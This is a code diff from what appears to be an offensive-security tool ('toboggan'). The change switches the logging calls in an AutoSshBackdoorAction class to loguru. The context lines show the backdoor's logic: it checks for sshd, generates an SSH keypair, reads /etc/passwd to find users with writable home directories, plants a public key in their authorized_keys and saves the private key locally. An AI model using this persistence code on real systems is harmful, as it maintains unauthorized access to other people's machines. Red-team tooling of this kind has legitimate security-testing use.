@@ -3,6 +3,10 @@ import tempfile
 import os
 from pathlib import Path
 
+# External library imports
+from loguru import logger
+
+# Local application/library specific imports
 from toboggan.core.action import BaseAction
 from toboggan.utils.methods import generate_fixed_length_token
 
@@ -16,28 +20,26 @@ class AutoSshBackdoorAction(BaseAction):
 
         sshd_path = self._executor.remote_execute("command -v sshd")
         if not sshd_path or "not found" in sshd_path.lower():
-            self._logger.warning(
+            logger.warning(
                 "⚠️ sshd is not installed on the target. SSH backdoor is currently unusable."
             )
             return "⚠️ sshd is not installed on the target."
         else:
-            self._logger.info(f"🧭 sshd binary found at: {sshd_path.strip()}")
+            logger.info(f"🧭 sshd binary found at: {sshd_path.strip()}")
             # Check if sshd is running
             check_sshd = self._executor.remote_execute("ps aux | grep '[s]shd'")
             if not check_sshd or "sshd" not in check_sshd:
-                self._logger.warning(
+                logger.warning(
                     "⚠️ sshd is not running on the target. You may need to start it manually."
                 )
                 return "⚠️ sshd is not running on the target."
             else:
-                self._logger.success("✅ sshd is running.")
+                logger.success("✅ sshd is running.")
 
         # Step 1: Locate ssh-keygen
         sshkeygen_path = self._executor.remote_execute("command -v ssh-keygen")
         if not sshkeygen_path or "not found" in sshkeygen_path.lower():
-            self._logger.warning(
-                "❌ ssh-keygen not available on target. Trying locally..."
-            )
+            logger.warning("❌ ssh-keygen not available on target. Trying locally...")
 
             if os.name != "posix":
                 return "❌ ssh-keygen not available remotely, and local OS is not Unix."
@@ -70,9 +72,9 @@ class AutoSshBackdoorAction(BaseAction):
 
                 private_key = key_path.read_text()
                 public_key = (key_path.with_suffix(".pub")).read_text()
-                self._logger.info("🔑 SSH keypair generated locally.")
+                logger.info("🔑 SSH keypair generated locally.")
         else:
-            self._logger.info(f"🔑 ssh-keygen found at: {sshkeygen_path}")
+            logger.info(f"🔑 ssh-keygen found at: {sshkeygen_path}")
             # Step 3: Generate random key filename and comment
             token = generate_fixed_length_token(6)
             key_path = f"/tmp/id_ed25519_{token}"
@@ -84,7 +86,7 @@ class AutoSshBackdoorAction(BaseAction):
             )
             self._executor.remote_execute(gen_cmd)
 
-            self._logger.info(f"🔑 SSH keypair generated at: {key_path}")
+            logger.info(f"🔑 SSH keypair generated at: {key_path}")
 
             # Step 5: Read keys
             private_key = self._executor.remote_execute(f"cat {key_path}")
@@ -92,14 +94,14 @@ class AutoSshBackdoorAction(BaseAction):
             if not private_key or not public_key:
                 return "❌ Failed to read generated key pair."
 
-            self._logger.info("🔑 SSH keypair read successfully.")
+            logger.info("🔑 SSH keypair read successfully.")
 
         # Step 2: Identify candidate users
         passwd_data = self._executor.remote_execute("cat /etc/passwd")
         if not passwd_data:
             return "❌ Could not read /etc/passwd."
 
-        self._logger.info("🔍 Searching for writable home directories...")
+        logger.info("🔍 Searching for writable home directories...")
 
         candidate_users = []
         for line in passwd_data.strip().splitlines():
@@ -123,7 +125,7 @@ class AutoSshBackdoorAction(BaseAction):
         if not candidate_users:
             return "⚠️ No writable home directories found."
 
-        self._logger.info(f"👤 Found {len(candidate_users)} writable home directories.")
+        logger.info(f"👤 Found {len(candidate_users)} writable home directories.")
 
         # Step 6: Inject pubkey to each valid user's authorized_keys
         injected = []
@@ -148,7 +150,7 @@ class AutoSshBackdoorAction(BaseAction):
         try:
             local_save_path.write_text(private_key)
             local_save_path.chmod(0o600)
-            self._logger.success(f"💾 Private key saved locally: {local_save_path}")
+            logger.success(f"💾 Private key saved locally: {local_save_path}")
         except Exception as e:
             return f"❌ Failed to save private key locally: {e}"
 
